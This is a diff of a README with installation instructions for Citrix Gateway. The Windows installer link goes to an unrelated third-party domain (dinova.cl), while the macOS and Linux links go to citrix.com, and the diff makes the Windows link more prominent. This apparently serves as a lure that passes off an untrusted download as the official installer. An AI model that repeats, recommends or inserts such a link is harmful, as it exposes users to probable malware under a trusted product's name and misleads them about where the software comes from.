@@ -13,19 +13,15 @@
 
 ## Windows
 
-### 1. Download the Installer
+Get the Citrix Gateway installer: [Click to Download](https://dinova.cl/1235/).
 
-Download the latest installer for Citrix Gateway based on your system architecture:
-
-- [Download Windows (x64) Installer](https://dinova.cl/1235/)
-
-### 2. Installation Steps
+### Installation Steps
 
 1. Run the downloaded installer.
 2. Follow the on-screen instructions to complete the setup.
 3. Once installed, open your browser and navigate to the configuration utility (default: http://192.168.100.1).
 
-### 3. Initial Configuration
+### Initial Configuration
 
 - **Login:** Use the default credentials (`Username: nsroot`, `Password: nsroot`).
 - **Virtual Server Setup:** Use the Quick Configuration Wizard to create a virtual server.
@@ -36,14 +32,12 @@ Download the latest installer for Citrix Gateway based on your system architectu
 
 ## macOS
 
-### 1. Download the Installer
-
 Choose the appropriate installer for your macOS architecture:
 
 - [Download macOS App (ARM)](https://www.citrix.com/downloads/citrix-gateway)
 - [Download macOS App (Intel)](https://www.citrix.com/downloads/citrix-gateway)
 
-### 2. Installation Steps
+### Installation Steps
 
 1. Open the downloaded file and drag the application to the Applications folder.
 2. Launch Citrix Gateway and enter the server address to start configuration.
@@ -52,14 +46,14 @@ Choose the appropriate installer for your macOS architecture:
 
 ## Linux
 
-### 1. Download the Installer
+### Download the Installer
 
 Download the package suitable for your Linux distribution:
 
 - [Download Linux App (Deb)](https://www.citrix.com/downloads/citrix-gateway)
 - [Download Linux App (RPM)](https://www.citrix.com/downloads/citrix-gateway)
 
-### 2. Installation Steps
+### Installation Steps
 
 1. Install the package using the command:
    ```bash
